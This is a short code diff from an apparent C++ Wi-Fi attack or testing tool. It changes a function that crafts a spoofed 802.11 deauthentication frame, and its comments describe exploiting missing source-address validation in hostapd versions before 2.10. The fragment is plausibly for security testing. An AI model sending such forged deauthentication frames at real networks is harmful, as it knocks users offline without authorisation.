@@ -24,11 +24,10 @@ using namespace chrono;
 // Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
 // The AP will process or forward in a way that breaks the SA Query exchange
 // patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
-static RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
+RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	Dot11Deauthentication frame(sta_mac, ap_mac);
 	frame.addr3(ap_mac);  // BSSID
 	frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
-
 	RadioTap rt{};
 	rt.inner_pdu(frame);
 	return rt;
